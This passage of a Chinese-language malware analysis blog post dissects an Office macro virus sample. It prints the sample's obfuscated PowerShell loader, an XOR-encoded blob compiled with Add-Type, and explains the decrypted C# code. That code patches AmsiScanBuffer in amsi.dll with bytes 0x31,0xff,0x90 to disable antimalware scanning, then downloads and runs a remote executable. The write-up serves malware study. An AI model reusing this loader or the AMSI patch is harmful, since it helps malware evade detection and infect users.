            }
        return $yce74a;
    }
    $z24c573 = '14465e5f52173018464354580c16125c595615641a1241525c1b65160f415e5c50192a0f4152435a4730044741585652105a4044585b5043324c4445505a4d255c56565b5810155c54420e4210085b5011664e1015505a1f7c785814465e5f5217301846435458192d04410c3c3f471603595e5215540f004644114c5502530c0f024e6c270d597e5c455811151d155a50450d04590403171b260f41454865580a0f410a137252173147585274530713504442171e3e1140555d5c5443124156455c5443044d4354475943285b436141454317020008571f2a0f41674547171b59510404031b1015475e5f52171556575206061e583a715b5d7c5a130e474319175c06135b525d0605414d705945474e330e5c594508152f0e54537d5c551100474e131c6a1314575b5856171015544358561706194152435b172a0f41674547170657030207510e4b124145585b50431b560154541e583a715b5d7c5a130e474319175c06135b525d0605414d705945474e330e5c594508153508474344545b33135a435456434148684744575b0a0215444554430a021552494152110f15555e5a5b43090254040d014b285b43614145430c5156060d01574d607e5f41671713155c0302550050571b445c5917414d545554515158195844411716085b4311470f5703060e180e6c270d597e5c455811151d157a50450d045904031b530f0d171b745b4311186558585b435e4367435d7858150478525c5a451a43196454417b02124172434758115c53565d46524a3c464350415e0041504f4550450d41435858511706070056541d7e0d1565434315565a550d5209197e0d15654343155b5b03040554195e0d15155005560106480e4744575b0a0215444554430a02155e5f411700500c04531d1e18285b4361414543020756540753555c500107000107581d4e0002060649170701000f5755000f0057025051530755171e4a5a5c511956050204075307140a2a0f416745471939044758184e7e0d1565434315455a57060308060a1556020e531d545100500555031b1a500206541d155151000f0501025b570302050505530702000507025454060203040641481c0c58531f11580304050c04425c7c59456543114f6f52435a1e18347c5945654311415d55505405075c1d62785b433315471e040e420a0f41175a0c5450560c0a010e5e05495d0052000f5549470e0706035a52195f535456510519074901074f0e4043115e0e0052020e181c4c211841526a68170904045255084c531906061d054f05071907490c071e5a7c5945654311415b55020700025c785643465f020d1b765d59580029725b5e57560f49061e0a785611125d565d1b740c114c1f5b5006060519071d5b55505302561d061e5804530250501f0d044217785b433315471f430c0150550c041f61582a0f4101051d1e48514d070104554a4d5b55020700024d061e0a484a1e124145585b504312040f0253565e245b415847580d0c5059451b70061573585d515211315443591d720d175c455e5b5a060f41196245520008545b775a5b070447197045470f085656455c580d255443501c174841176b6d560e51540015111e171a500206541d155707000705530257431c0c5f50404336505572595e060f411f181b730c165b5b5e545325085952194c065450501f13050e5750010405040355515103520152565700010453020154030700050f57570100050602025502070704045750015204060354540d070905035756010300530255540d075401525754000f0504060251530552040155530254050600505703020205015555000f0654035251500355050357050005131c1b10500d0457541e583147585250441032415643417e0d075a174803540153085954421733135a5454464430155445457c59050e1d44000d0405001c0c614758000446441f66430213411f48035401531c0c43504316135b17010e4a1314575b585617101554435856171015475e5f52171a500206541d4417135c5956155a06590c0e051c4c1015475e5f52171b59510404030a4100000000000000430e4445475e0d06155207030255050c0a13170c050e471f585b43430808070a155e5f0c500f080c034d2d505956415f58081e0a031c4c011841521143005458570a725a59150447431f6158211841521958525b580c031f664201124145585b504b08190518190655480e5207030255050c1c0c1d540b00471e19430054585769490d535054036c195c185148104f09510456571b7b545b501709681e0a4845061540455f155255570001550c0c1e1c';
    $z24c5732 = y171e($z24c573);
    Add-Type -TypeDefinition $z24c5732;
    [yba2983]::c193b();
### 分析powershell脚本
上面的代码可以看到：
首先，程序将值`$z24c573`传入函数`y171e`，这里的`y171e`应该是一个解密函数。解密过后的内容存于`$z24c5732`；
然后，调用`Add-Type -TypeDefinition`将该类添加到会话中，由于由于它使用的是内联源代码，所以该命令使用
`TypeDefinition` 参数来指定 `$z24c5732` 变量中的代码。（MSDN中我们可以知道，使用Add-Type 可以在Windows
PowerShell会话定义添加 Microsoft .NET Framework
类型（一种类）。这就表明`$z24c5732`存储的解密后的内容其实是一个`.Net`的程序源码。[Add-Type | Microsoft
Docs](https://docs.microsoft.com/zh-CN/previous-versions//dd315241\(v=technet.10)?redirectedfrom=MSDN)）。
最后，`[yba2983]::c193b();`调用类的静态方法
> **调用类的静态方法** ：用中括号把类的名称括起来，然后输入两个冒号，然后再输入方法名，最后是方法的参数。
>
> **访问类的静态属性** ：用中括号把类的名称括起来，然后输入两个冒号，然后再输入属性名。来访问.NET类的静态属性。
>
> **调用对象的方法** ：在对象变量之后使用点（.）作为成员变量符，然后加上方法名，和方法参数即可。
>
>
> [PowerShell中调用.NET对象的静态方法、静态属性和类方法、类属性例子](https://www.jb51.net/article/53191.htm)。
**我们需要知道经过y171e函数解密过后存放在变量$z24c5732中的内容是什么。**
powershell或者cmd窗口中输入`powershell_ise.exe`启动 **powerShell ISE**
工具进行调试，将原powershell脚本的第一行和最后两行删去，直接输出变量`$24c5732`的内容如下:
保存为1.ps1，运行脚本得到解密内容（需要以管理员身份打开powershell.exe然后set-executionpolicy
remotesigned修改执行策略为remotesigned）
如下：
### 分析.NET代码
我们在Visual Studio2019，创建一个C#控制台应用程序，将解密出来的.Net代码提出来进行分析：
可以看到，程序导入了kernel.dll的4个API函数：
    [DllImport("kernel32", EntryPoint = "GetProcAddress")] public static extern IntPtr v779b(IntPtr x8d356, string v7be73);
        [DllImport("kernel32", EntryPoint = "LoadLibrary")] public static extern IntPtr e6656d9(string zc6ea);
        [DllImport("kernel32", EntryPoint = "VirtualProtect")] public static extern bool h7c586(IntPtr mda7864, UIntPtr k27bc1b, uint xcdaf29, out uint r84b39);
        [DllImport("Kernel32.dll", EntryPoint = "RtlMoveMemory", SetLastError = false)] static extern void ef5ae(IntPtr a948e8, IntPtr l8b12e, int g4c6e);
函数y171e()就是解密函数，将传入的字符串和字符串"a57157c"中的一些值进行异或操作，然后返回解密出的字符串。
函数c193b()就是Run函数，如下：
可以看到，其中多次调用y171e()函数共解密了四个字符串。
> amsi.dll
>
> AmsiScanBuffer
>
> C:\Users\thh\AppData\Roaming\c9255.exe
>
> 
函数先解密了前两个字符串，`LoadLibrary`导入amsi.dll然后`GetProcAdderss`获取`AmsiScanBuffer`地址。然后判断获取的函数指针是否为空，如果不为空，执行下面的if语句。然后调用`VirtualProtect`函数修改对应的内存属性从仅可读修改为可读可写（PAGE_EXECUTE_READWRITE
= 0x40），之后调用`Marshal`函数分配内存并将`Byte[] jeled = {0x31, 0xff,
0x90}`复制到AmsiScanbufferAddr + 0x001b的内存区域
amsi是什么？这些操作是要干嘛？`AmsiScanBuffer`的作用是什么？0x31, 0xff, 0x90复制到AmsiScanbufferAddr
+ 0x001b的内存区域是要干嘛？
Google搜索到对AMSI的解释如下：
> AMSI（Antimalware Scan Interface，反恶意软件扫描接口）。反恶意软件解决方案支持 AMSI，那么在 Windows 10
> 上就可以阻止 PowerShell 攻击代码的执行。 反恶意软件扫描接口 (AMSI)
> 是一种允许应用程序和服务集成在一台机器上的任何反恶意软件产品的泛型接口标准。
Google搜索Byte[] jeled = {0x31, 0xff, 0x90}找到绕过AMSI的文章如下：
> [AMSI Bypass Redux](https://www.cyberark.com/resources/threat-research-> blog/amsi-bypass-redux)
可以得知，if判断当中的内容其实就是绕过AMSI的代码。
现在我们知道这个.NET代码的作用了，总结一下：
首先导入四个API，
然后解密两个字符串，获取`AmsiScanBuffer`地址，`AmsiScanBuffer`的作用就是给amsi.dll打补丁以此绕过AMSI，防止被扫描到；
紧接着就是语句`MoveMemory(AmsiScanbufferAddr + 0x001b, unmanagedPointer,
3);`给amsi.dll打补丁（0x31, 0xff, 0x90）绕过AMSI（使用xor
edi，edi操作码对相关行（将rd8提交到edi寄存器的行）打补丁）。
最后解密两个字符串，一个网址，一个本地文件路径，调用`WebClient`函数将网址上的文件下载到指定路径并启动运行。
但是很遗憾，这个网站已经炸了，下载不了这个文件了。这个网站可能是随关随停的，当时用了就关了，也有可能是被举报下挂了。
由于该样本动态给amsi.dll打了补丁以此绕过了AMSI的检测，使得一部分厂商没有查杀到该病毒。
# 总结
由于是第一次分析Office宏病毒样本，很多地方我都阐述得或许不是很恰当，对VBA程序的分析、powershell脚本的调试都稍显得有些生疏，但是在在分析该样本的过程中我也逐渐熟悉一些宏病毒的一些常规分析手法：VBA程序、powershell脚本、.NET程序。学习C#、powershell脚本、VBA的一些语法和API的用法，熟悉了AMSI（Antimalware
Scan Interface，反恶意软件扫描接口）机制，也顺带学习了如何绕过AMSI。
**参考**
[Add-Type | Microsoft Docs](https://docs.microsoft.com/zh-CN/previous-versions//dd315241\(v=technet.10)?redirectedfrom=MSDN)
[PowerShell中调用.NET对象的静态方法、静态属性和类方法、类属性例子](https://www.jb51.net/article/53191.htm)
[Antimalware Scan Interface (AMSI)](https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal)
[AMSI Bypass Redux](https://www.cyberark.com/resources/threat-research-blog/amsi-bypass-redux)
[Obfuscated VBA, Powershell,
C#](https://www.ringzerolabs.com/2020/10/obfuscated-vba-powershell-c.html)